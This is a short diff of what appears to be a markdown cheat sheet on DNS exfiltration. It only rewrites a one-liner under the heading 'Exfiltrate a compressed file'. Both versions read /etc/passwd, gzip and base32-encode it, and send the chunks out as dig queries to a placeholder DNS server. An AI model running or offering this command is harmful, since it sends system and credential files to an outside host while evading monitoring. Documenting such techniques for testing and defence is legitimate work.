@@ -52,7 +52,7 @@ To recover the file:
 ### Exfiltrate a compressed file:
 
 ```
-cat /etc/passwd | gzip - | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
+gzip - < /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
 ```
 
 To recover/unzip the file:
